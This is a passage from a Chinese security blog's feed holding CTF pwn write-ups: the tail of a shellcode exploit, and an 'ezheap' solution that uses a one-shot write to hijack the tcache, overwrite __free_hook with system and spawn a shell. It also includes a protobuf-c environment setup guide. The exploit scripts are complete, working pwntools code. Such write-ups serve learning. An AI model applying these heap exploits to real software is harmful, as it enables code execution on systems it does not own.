pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* read size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_read</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* write size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_write</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x15</span>+asm(sc))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-ezheap"><a href="#0x05-ezheap" class="headerlink" title="0x05 ezheap"></a>0x05 ezheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>劫持tcache管理堆。最多只能申请32个次，delete没有UAF，也没有堆溢出。但是edit函数非常地奇怪。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_chunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *buf; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;one chance for you&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  *buf = <span class="number">666666</span>;</span><br><span class="line">  ++a;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一次机会可以往任意地址写一个666666（bytes类型）。注意*buf的类型是DWORD，所以实际上是写入0x00A2C2A。重点在于可以利用写进去的00，如果精心构造，可以利用这个00劫持tcache管理堆，造成堆叠。也就是同一个堆地址会进入到两条大小不同的tcachebin当中。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>前置脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice\n&quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Size :\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Content :\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;content :\n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>先泄露地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)  <span class="comment"># 从unsorted切割</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1EC061</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 0xb0 4-&gt;3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 5   原4 tcache</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x361</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><p>其实这里已经有为了后面的堆风水进行构造了。chunk4的地址是0x*400，最后一个字节刚好是00。为了防止unsortedbin切割都后面堆叠造成影响，我们需要先申请足够多的chunk，使unsortedchunk进入到smallbin中。然后把chunk5再次释放，使其先进入到tcache中，方便后面进行内容修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 8 把unsortedchunk取到后面不够取，进到smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment"># 0xb0 5-&gt;3 or 4-&gt;3</span></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># 0x110 6</span></span><br></pre></td></tr></table></figure><p>然后最重要的一步来了。现在堆长这样。</p><p><img src="https://c-lby.top/images/2024YLCTF-1/edit%E5%89%8D%E5%A0%86.png" alt="edit前堆"></p><p>红色框是0xb0大小chunk的头，蓝色框是0x110的。如果我在heap_base+0x105的地方开edit，那么00就会被写到蓝色框的低一位字节。这样一来，我一申请0x110，就能申请到0x*400的堆，我申请0xb0也是一样的。那这就达到了堆叠的效果。后面先申请0x110然后修改fd位为free_hook，再申请两个0xb0的堆，就能达到free_hook，修改为ogg或者system即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, p64(free_hook))  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0xa0</span>, p64(system))  <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice\n&quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Size :\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Content :\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;content :\n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)  <span class="comment"># 从unsorted切割</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1EC061</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 0xb0 4-&gt;3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 5   原4 tcache</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x361</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 8 把unsortedchunk取到后面不够取，进到smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment"># 0xb0 5-&gt;3 or 4-&gt;3</span></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># 0x110 6</span></span><br><span class="line">edit(p64(heap_base+<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x100</span>, p64(free_hook))  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0xa0</span>, p64(system))  <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x06-msg-bot"><a href="#0x06-msg-bot" class="headerlink" title="0x06 msg_bot"></a>0x06 msg_bot</h2><p>protobuf+shellcode过滤。另起一篇<a href="https://c-lby.top/2024/10/12/YLCTF-msgbot-protobuf/">文章</a>细讲。</p>]]></content>
    
    
    <summary type="html">ROUND1</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>protobuf pwn题环境配置及基础操作</title>
    <link href="https://c-lby.top/2024/10/11/protobuf-install/"/>
    <id>https://c-lby.top/2024/10/11/protobuf-install/</id>
    <published>2024-10-11T15:17:23.000Z</published>
    <updated>2024-10-11T16:35:42.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-配置环境"><a href="#0x00-配置环境" class="headerlink" title="0x00 配置环境"></a>0x00 配置环境</h2><p>VMware Ubuntu22.04<br>VMware Ubuntu20.04<br>WSL2 Ubuntu22.04均按照步骤配置环境没有问题</p><p>windows环境没有测试</p><p>关于protobuf，网上有很多介绍，不多赘述。</p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><h3 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h3><p>请确保环境安装了make并且能正常使用，因为项目需要自己编译。</p><p>Ubuntu22是默认自带较高版本的protobuf的，如果你不打算两个版本同时存在在电脑上的话，可以选择卸载。（两个版本一起也能用，但比较麻烦，我没研究）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> protoc</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">protoc: /usr/bin/protoc（虽然不知道为什么我的实在anaconda下）</span></span><br><span class="line">rm -rf /usr/bin/protoc #这里的路径是上面显示的路径</span><br><span class="line"></span><br><span class="line">sudo rm -rf /usr/include/google/protobuf #头文件</span><br><span class="line">sudo rm -rf /usr/local/include/google/protobuf #头文件</span><br><span class="line">sudo rm -rf /usr/lib/libproto* #库文件</span><br><span class="line">sudo rm -rf /usr/local/lib/libproto* # 库文件</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/h799710/article/details/126762153">来源</a></p><h3 id="编译安装protoc库"><a href="#编译安装protoc库" class="headerlink" title="编译安装protoc库"></a>编译安装protoc库</h3><p>（protoc是protobuf的库，不是protobuf-c的，请注意区分）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-all-3.6.1.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvzf protobuf-all-3.6.1.tar.gz</span></span><br></pre></td></tr></table></figure><p>也可以在浏览器中下载后手动解压。这里下载的版本比较旧了，是为了适配后面要安装的protobuf-c，如果不需要，也可以下载最新版（但是一般做pwn题目前大多都还是C语言写的）。如果只需要C不需要其他语言的，也可以下载只有<a href="https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-cpp-3.6.1.tar.gz">cpp版本</a>的，可以减小体积和加快编译（但不多）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> protobuf-all-3.6.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure &amp;&amp; make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure><p>其实上面三步建议分开，要是哪一步出问题了还可以去查一查。在install之前可以运行<code>make check</code>检查一下。make需要花点时间，取决于你的电脑性能。编译完之后运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/local/lib/libprotobuf.so.17 /usr/lib/libprotobuf.so.17</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/local/lib/libprotoc.so.17 /usr/lib/libprotoc.so.17</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ldconfig</span></span><br></pre></td></tr></table></figure><p>这时候输入<code>protoc --version</code>应该就会回显<code>libprotoc 3.6.1</code>，如果回显3.20.x，说明是Ubuntu22原本自带的版本没删干净。</p><h3 id="编译安装protobuf-c"><a href="#编译安装protobuf-c" class="headerlink" title="编译安装protobuf-c"></a>编译安装protobuf-c</h3><p>protobuf原生并不支持C，这里用一个第三方库来兼容C语言。编译步骤和上面一样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/protobuf-c/protobuf-c/releases/download/v1.5.0/protobuf-c-1.5.0.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvzf protobuf-c-1.5.0.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> protobuf-c-1.5.0</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure &amp;&amp; make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure><p>顺带一提，如果上面protobuf安装的版本过高，那么在configure的时候会提示没找到protobuf。</p><h3 id="安装python第三方库"><a href="#安装python第三方库" class="headerlink" title="安装python第三方库"></a>安装python第三方库</h3><p>写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。不用像网上把整个google库都下下来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip3 install protobuf==3.20.3</span></span><br></pre></td></tr></table></figure><p>这里protobuf的版本要用到3.20.x（只有1 2 3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。</p><h2 id="基础使用方法"><a href="#基础使用方法" class="headerlink" title="基础使用方法"></a>基础使用方法</h2><p>-I参数指定proto源码目录，–c_out参数指定生成的类声明与实现文件的输出目录。如果proto文件就在当前目录，直接运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">protoc --c_out=. filename.proto</span></span><br></pre></td></tr></table></figure><p>那么文件就会生成在当前目录。如果你想出题和对照着函数实现来逆向，那么这一步是必要的。如果你要用python写脚本，那么你需要生成python的实现代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">protoc --python_out=. filename.proto</span></span><br></pre></td></tr></table></figure><h2 id="运行须知"><a href="#运行须知" class="headerlink" title="运行须知"></a>运行须知</h2><p>如果程序使用了protobuf，那必定需要libprotobuf动态库的。上述安装的版本下，运行库的名字叫<code>libprotobuf-c.so.1</code>。假如protobuf_demo是一个使用了protobuf的程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldd protobuf_demo</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffcc5597000)</span><br><span class="line">        libprotobuf-c.so.1 =&gt; /usr/local/lib/libprotobuf-c.so.1 (0x00007f2a99c64000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2a99a3b000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f2a99c81000)</span><br></pre></td></tr></table></figure><p>光有<code>libprotobuf-c.so.1</code>也不够，还需要<code>libprotobuf-c.so.1.0.0</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldconfig -v</span></span><br><span class="line">...</span><br><span class="line">/usr/local/lib: (from /etc/ld.so.conf.d/libc.conf:2)</span><br><span class="line">        libprotobuf-c.so.1 -&gt; libprotobuf-c.so.1.0.0</span><br><span class="line">        libprotobuf.so.17 -&gt; libprotobuf.so.17.0.0</span><br><span class="line">        libprotobuf-lite.so.17 -&gt; libprotobuf-lite.so.17.0.0</span><br><span class="line">        libprotoc.so.17 -&gt; libprotoc.so.17.0.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果在一个纯净的环境（容器）或者版本不适配（高版本的protobuf动态库名字不一样）的情况下，不想安装完整的protobuf又想要运行程序的，可以把这两个文件放到<code>/usr/local/lib</code>下，并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -sf /usr/local/lib/libprotobuf-c.so.1.0.0 /usr/local/lib/libprotobuf-c.so.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ldconfig</span></span><br></pre></td></tr></table></figure><p>如果不想破坏原本高版本的protobuf，可以就放在程序目录下，运行上面的命令先链接，然后利用patchelf来修改动态链接库路径。有时候也可能是不知道为什么程序就运行不了的，也可以用这种方式试试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --print-needed protobuf_demo <span class="comment">#打印程序需要的动态库</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --replace-needed libprotobuf-c.so.1 ./libcprotobuf-c.so.1 protobuf <span class="comment">#第二个libcproto*是附件给你的或者你下载的动态库的路径</span></span></span><br></pre></td></tr></table></figure><p>配置容器时同理。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">Real返璞归真师傅的全面解析</a></p>]]></content>
    
    
    <summary type="html">自从国赛遇到protobuf题目之后就一直想好好研究一下，最近才学习其用法。</summary>
    
    
    
    <category term="protobuf" scheme="https://c-lby.top/categories/protobuf/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN，protobuf" scheme="https://c-lby.top/tags/PWN%EF%BC%8Cprotobuf/"/>
    
  </entry>
  
  <entry>
    <title>『图灵完备』完全攻略之基础逻辑电路（一）</title>
    <link href="https://c-lby.top/2024/09/25/Turing-Complete-1/"/>
    <id>https://c-lby.top/2024/09/25/Turing-Complete-1/</id>
    <published>2024-09-25T12:40:24.000Z</published>
    <updated>2024-10-11T16:41:55.925Z</updated>
    
